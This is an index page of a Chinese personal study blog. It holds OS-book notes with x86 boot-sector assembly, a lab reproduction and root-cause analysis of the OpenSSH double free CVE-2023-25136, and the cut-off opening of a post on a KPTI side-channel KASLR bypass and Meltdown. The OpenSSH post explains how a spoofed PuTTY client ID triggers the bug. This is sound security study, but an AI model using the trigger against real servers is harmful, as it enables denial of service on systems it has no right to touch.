<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="我的博客">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="我的博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E7%9B%B8%E8%BF%98%E5%8E%9F%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E7%9B%B8%E8%BF%98%E5%8E%9F%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">操作系统真相还原阅读笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-11 16:52:21 / 修改时间：16:56:21" itemprop="dateCreated datePublished" datetime="2023-02-11T16:52:21+08:00">2023-02-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="操作系统真相还原阅读笔记"><a href="#操作系统真相还原阅读笔记" class="headerlink" title="操作系统真相还原阅读笔记"></a>操作系统真相还原阅读笔记</h1><p>学的慢，忘的快，做个记录防止发生学了后面学了忘了前面的事情。</p>
<h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2><p>基本输入输出模块，储存在rom中，rom也被包括在内存中，BIOS天生存在在内存中，所以不需要被装载，而且地址是固定，一般在0xf0000~0xfffff中，所以在机器通电的一瞬间cpu的cs:ip就指向了BIOS的某个地址，来运行BIOS，此时处于实模式。</p>
<p>BIOS主要检测硬件，做各种初始化，建立中断向量表。</p>
<h2 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h2><p>主引导记录，固定于0盘0道1扇区，这个扇区称为MBR引导扇区，mbr存在在硬盘中，当BIOS执行完自己的逻辑，然后会把mbr加载到内存中，地址固定为0x7c00,最后BIOS执行<code>jmp 0:7c00</code>跳到MBR。</p>
<p>简单的mbr代码</p>
<p>代码并不复杂，主要是使用了BIOS中断例程0x10来向屏幕输出字符串<code>hello mbr</code>，其中比较有意思的点就是<code>SECTION MBR vstart=0x7c00</code>,让起始地址为0x7c00,这么做的原因是BIOS只负责把MBR加载到0x7c00指向的内存中，并不会给他重定位，所以代码本身就得从0x7c00开始，代码才会正常运行。</p>
<p>虽然不复杂，但给我一种错觉，好像编写底层代码并不是一件非常困难的事情，搞懂了代码的运行环境就比较容易了，比如下面这段代码，他的起始地址必须是0x7c00,运行在实模式中，有BIOS提供的一些中断API，知道了这些就可以编写简单的代码了（逃。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SECTION MBR vstart=0x7c00</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov fs,ax</span><br><span class="line">    mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">    mov ax,0x600</span><br><span class="line">    mov bx,0x700</span><br><span class="line">    mov cx,0</span><br><span class="line">    mov dx,0x184f</span><br><span class="line">    int 0x10</span><br><span class="line">    </span><br><span class="line">    mov ah,3</span><br><span class="line">    mov bh,0</span><br><span class="line">    int 0x10</span><br><span class="line"></span><br><span class="line">    mov ax, msg</span><br><span class="line">    mov bp,ax</span><br><span class="line">    mov cx,9</span><br><span class="line">    mov ax,0x1301</span><br><span class="line">    mov bx,0x2</span><br><span class="line">    int 0x10</span><br><span class="line">    </span><br><span class="line">    jmp $</span><br><span class="line"></span><br><span class="line">    msg db &quot;hello mbr&quot;</span><br><span class="line">    times 510-($-$$) db 0</span><br><span class="line">    db 0x55,0xaa</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20230207213759574.png" alt="image-20230207213759574"></p>
<p>上面是通过调用BIOS的api来完成的清屏和输出，其实可以直接操作显卡的显存来完成这一件事。主要就是把显存的第一页全置为0，然后把想输入的字符串输入进去。</p>
<p>比较麻烦的是实模式不支持很多的汇编语句，比如<code>mov cl, byte [ax]</code>，赶紧进入保护模式吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SECTION MBR vstart=0x7c00</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov fs,ax</span><br><span class="line">    mov sp,0x7c00</span><br><span class="line">    mov ax,0xb800</span><br><span class="line">    mov gs,ax</span><br><span class="line">    mov bx,0</span><br><span class="line">clear:</span><br><span class="line">    mov byte [gs:bx] ,0</span><br><span class="line">    add bx,1</span><br><span class="line">    cmp bx,4000</span><br><span class="line">    jnz clear</span><br><span class="line"></span><br><span class="line">    mov bx,0</span><br><span class="line">    mov di, msg</span><br><span class="line">write:</span><br><span class="line">    mov cl,byte [di]</span><br><span class="line">    mov byte [gs:bx], cl</span><br><span class="line">    add bx,1</span><br><span class="line">    mov byte [gs:bx], 0xa4</span><br><span class="line">    add bx,1</span><br><span class="line">    add di,1</span><br><span class="line">    mov ax,di</span><br><span class="line">    cmp ax,msg+9</span><br><span class="line">    jnz write</span><br><span class="line"></span><br><span class="line">    jmp $</span><br><span class="line"></span><br><span class="line">    msg db &quot;hello mbr&quot;</span><br><span class="line">    times 510-($-$$) db 0</span><br><span class="line">    db 0x55,0xaa</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20230209165230171.png" alt="image-20230209165230171"></p>
<p> mbr只是启动的其中一个流程，主要的功能就是加载内核加载器，然后跳到内核加载器执行，内核加载器默认在第二个扇面，书中指定加载器加载到内存的0x900处，所以mbr需要做的工作就是把内核加载器loader从硬盘中读出来，读到内存0x900处，然后jmp 0x900就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">%include &quot;boot.inc&quot;</span><br><span class="line">SECTION MBR vstart=0x7c00</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov fs,ax</span><br><span class="line">    mov sp,0x7c00</span><br><span class="line">    mov ax,0xb800</span><br><span class="line">    mov gs,ax</span><br><span class="line">    mov bx,0</span><br><span class="line">clear:</span><br><span class="line">    mov byte [gs:bx] ,0</span><br><span class="line">    add bx,1</span><br><span class="line">    cmp bx,4000</span><br><span class="line">    jnz clear</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov bx,0</span><br><span class="line">    mov di, msg</span><br><span class="line">write:</span><br><span class="line">    mov cl,byte [di]</span><br><span class="line">    mov byte [gs:bx], cl</span><br><span class="line">    add bx,1</span><br><span class="line">    mov byte [gs:bx], 0xa4</span><br><span class="line">    add bx,1</span><br><span class="line">    add di,1</span><br><span class="line">    mov ax,di</span><br><span class="line">    cmp ax,msg+9</span><br><span class="line">    jnz write</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov eax,LOADER_START_SELCTOR</span><br><span class="line">    mov bx,LOADER_BASE_ADDR</span><br><span class="line">    mov cx,1</span><br><span class="line"></span><br><span class="line">    call ld_disk_loader</span><br><span class="line">    jmp LOADER_BASE_ADDR</span><br><span class="line"></span><br><span class="line">ld_disk_loader:</span><br><span class="line">    mov esi,eax  ;備份eax</span><br><span class="line">    mov di,cx    ;備份cx</span><br><span class="line">    </span><br><span class="line">;設置要讀取的扇區數</span><br><span class="line">    mov dx,0x1f2</span><br><span class="line">    mov al,cl</span><br><span class="line">    out dx,al</span><br><span class="line">    mov eax,esi</span><br><span class="line"></span><br><span class="line">;把loader的地址存入0x1f3到0x1f6</span><br><span class="line">    mov dx,0x1f3</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    mov cl,8</span><br><span class="line">    shr eax,cl</span><br><span class="line">    mov dx,0x1f4</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    shr eax,cl</span><br><span class="line">    mov dx,0x1f5</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    shr eax,cl</span><br><span class="line">    and al,0x0f</span><br><span class="line">    or al,0xe0</span><br><span class="line">    mov dx,0x1f6</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    mov dx,0x1f7</span><br><span class="line">    mov al,0x20</span><br><span class="line">    out dx,al</span><br><span class="line"></span><br><span class="line">    .not_ready:</span><br><span class="line">        nop</span><br><span class="line">        in al ,dx</span><br><span class="line">        and al,0x88</span><br><span class="line">        cmp al,0x08</span><br><span class="line">        jnz .not_ready</span><br><span class="line"></span><br><span class="line">    mov ax, di</span><br><span class="line">    mov dx,256</span><br><span class="line">    mul dx</span><br><span class="line">    mov cx,ax</span><br><span class="line">    mov dx,0x1f0</span><br><span class="line"></span><br><span class="line">    .read_loader:</span><br><span class="line">        in ax,dx</span><br><span class="line">        mov [bx],ax</span><br><span class="line">        add bx,2</span><br><span class="line">        loop .read_loader</span><br><span class="line">    </span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">    msg db &quot;hello mbr&quot;</span><br><span class="line">    times 510-($-$$) db 0</span><br><span class="line">    db 0x55,0xaa</span><br></pre></td></tr></table></figure>

<p>写汇编还挺有意思的(逃。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/11/CVE-2023-25136-doublefree/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/11/CVE-2023-25136-doublefree/" class="post-title-link" itemprop="url">CVE-2023-25136 doublefree</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-11 16:52:05 / 修改时间：16:55:47" itemprop="dateCreated datePublished" datetime="2023-02-11T16:52:05+08:00">2023-02-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CVE-2023-25136-doublefree"><a href="#CVE-2023-25136-doublefree" class="headerlink" title="CVE-2023-25136 doublefree"></a>CVE-2023-25136 doublefree</h1><p>0.45元的巨额红包让我获得了复现这个cve的机会。</p>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>这个cve出现在openssh9.1p上，所以得安装这个版本的openssh,我是下载源码然后编译安装的，起初这样做的目的是便于后面gdb源码调试，但在安装完之后使用一般启动sshd的命令并没有办法启动成功，比如这种命令。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd start</span><br></pre></td></tr></table></figure>

<p>至于为什么不能这样做，大概率是我编译安装的openssh并不是通过apt安装的，导致包管理中没有sshd的信息，要启动自己编译安装的openssh得通过自己编译的sshd启动，比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/lot/openssh/openssh-9.1p1/sshd</span><br><span class="line"><span class="comment">#也可以这样，不过这个sshd没有符号表</span></span><br><span class="line">/usr/sbin/sshd</span><br><span class="line">/usr/<span class="built_in">local</span>/sbin/sshd</span><br></pre></td></tr></table></figure>

<p>这样就算搭建成功了，白神给的文章中说还需要修改sshd_config文件，经过我的测试，发现并不需要，在这篇文章中，作者是采用PuTTY软件和sshd交互的，而且他使用的PuTTY版本很低，所以里面的一些协议或者算法过时了可能，想要连接成功就需要sshd也支持这些过时的协议或者算法，在poc脚本中直接采用<code>paramiko</code>模块和sshd交互，这个模块没有使用这些旧协议或者算法，所以不需要。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>首先是PuTTY和sshd的关系，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=putty&spm=1001.2101.3001.7020">putty</a>就是个连接工具。一般是windows用，支持ssh协议，当PuTTY连接sshd的时候，会在连接报文中会表明自己是PuTTY,poc脚本的<code>transport.local_version = f&quot;SSH-2.0-&#123;CLIENT_ID&#125;&quot;</code>就是干这件事，然后sshd分析报文，解析出这个字段后就会进入专门的处理函数。</p>
<p>漏洞就出现在处理函数<code>compat_kex_proposal</code>上,下面是这个函数的代码.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">compat_kex_proposal(struct ssh *ssh, <span class="keyword">char</span> *p)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *cp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ssh-&gt;compat &amp; (SSH_BUG_CURVE25519PAD|SSH_OLD_DHGEX)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> xstrdup(p);</span><br><span class="line">    debug2_f(<span class="string">&quot;original KEX proposal: %s&quot;</span>, p);</span><br><span class="line">    <span class="keyword">if</span> ((ssh-&gt;compat &amp; SSH_BUG_CURVE25519PAD) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> ((p = match_filter_denylist(p,</span><br><span class="line">            <span class="string">&quot;curve25519-sha256@libssh.org&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">            fatal(<span class="string">&quot;match_filter_denylist failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((ssh-&gt;compat &amp; SSH_OLD_DHGEX) != <span class="number">0</span>) &#123;               [<span class="number">1</span>]</span><br><span class="line">        cp = p;                                             [<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> ((p = match_filter_denylist(p,</span><br><span class="line">            <span class="string">&quot;diffie-hellman-group-exchange-sha256,&quot;</span></span><br><span class="line">            <span class="string">&quot;diffie-hellman-group-exchange-sha1&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">            fatal(<span class="string">&quot;match_filter_denylist failed&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(cp);                                           [<span class="number">3</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    debug2_f(<span class="string">&quot;compat KEX proposal: %s&quot;</span>, p);</span><br><span class="line">    <span class="keyword">if</span> (*p == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        fatal(<span class="string">&quot;No supported key exchange algorithms found&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>openssh是这样调用这个函数的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrb = compat_kex_proposal(v90, options.kex_algorithms);</span><br></pre></td></tr></table></figure>

<p>他把全局变量options的<code>kex_algorithms</code>传入了这个函数，即<code>p=kex_algorithms</code>然后当选择[1]条件通过时就让cp=p,然后free(cp)，相当于free(<code>kex_algorithms</code>),关键就是他free完没有清空kex_algorithms，然后在<code>assemble_algorithms()</code>函数中又调用了这样一条语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = kex_assemble_names(&amp;o-&gt;kex_algorithms, def_kex, v3);</span><br></pre></td></tr></table></figure>

<p>他把<code>kex_algorithms</code>的地址又传入<code>kex_assemble_names()</code>函数中，他会执行下面这段代码，其中<code>list</code>就等于<code>kex_algorithms</code>的值，这样就把一个堆块free了两次，导致程序崩溃。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((tmp = kex_names_cat(<span class="built_in">list</span> + <span class="number">1</span>, def)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	r = SSH_ERR_ALLOC_FAIL;</span><br><span class="line">	<span class="keyword">goto</span> fail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(<span class="built_in">list</span>);</span><br></pre></td></tr></table></figure>

<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>直接拿poc跑，然后断在<code>kex_assemble_names()</code>函数的<code>free(list)</code>语句，下面是当时的截图，能够比较清晰的看见即将free<code>0x556d983e2a00</code>，但这个堆块同时在<code>smallbins</code>上，肯定就会导致doublefree，进而导致程序崩溃。</p>
<p><img src="http://m.qpic.cn/psc?/V12wHRbC0mzZmN/ruAMsa53pVQWN7FLK88i5qS9uOONY2WMoc2pM5f6orb0rPkz.VrDrprVwhsFUlrcCYIZsptb15LZzvPcWE6kIwsBBHdzULX6RfxLSfJR8qQ!/b&bo=fAMgAgAAAAADJ18!&rf=viewer_4" alt="image-20230211161643273"></p>
<p><img src="http://m.qpic.cn/psc?/V12wHRbC0mzZmN/ruAMsa53pVQWN7FLK88i5g9f4er0rqCj98*cOdruvv8GRIXnza7*gNuo.xO9nEhyXcojvtxGAgOQfm21O6RJipk*KPz7*34NU2aK6IP0SR0!/b&bo=5APpAgAAAAADBy4!&rf=viewer_4" alt="image-20230211161652858"></p>
<p>直接注意的一点是不能先断在<code>compat_kex_proposal</code>让程序执行到这里再断到<code>free(list)</code>，因为这个过程很耗时，导致客户端退出连接，那sshd也不会执行正常逻辑了，即不会执行到<code>free(list)</code>。</p>
<h2 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h2><p>感觉有点差强人意，sshd是每有一个连接就新开一个进程，这个cve只能导致和自己连接的分支进程崩溃，不会导致sshd崩溃。至于能不能rce,我只能说理论上可以。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/08/CVE-2022-4543%E5%8F%8Akpti%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/08/CVE-2022-4543%E5%8F%8Akpti%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">CVE-2022-4543及kpti机制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-08 18:57:36 / 修改时间：20:37:25" itemprop="dateCreated datePublished" datetime="2023-02-08T18:57:36+08:00">2023-02-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CVE-2022-4543及kpti机制"><a href="#CVE-2022-4543及kpti机制" class="headerlink" title="CVE-2022-4543及kpti机制"></a>CVE-2022-4543及kpti机制</h1><p>翻腾讯玄武公众号看到了这个cve-2022-4543，令我这个菜鸡大受震撼。</p>
<p>据我了解kpti有一部分就是为了缓解kaslr的侧信道攻击和内核页表泄露而产生的机制，但是这个cve居然通过kpti侧信道来绕过kaslr🤣，缓解了个寂寞。</p>
<h2 id="Meltdown攻击"><a href="#Meltdown攻击" class="headerlink" title="Meltdown攻击"></a>Meltdown攻击</h2><p>Meltdown攻击是一种直接针对底层硬件机制（CPU的乱序执行机制、Cache机制和异常处理机制）的时间侧信道攻击，它的基本原理如下所示：</p>
<img src="https://pic3.zhimg.com/80/v2-0b84759aa099951da430e0e8b7fd3e1a_720w.webp" alt="img" style="zoom:67%;" />

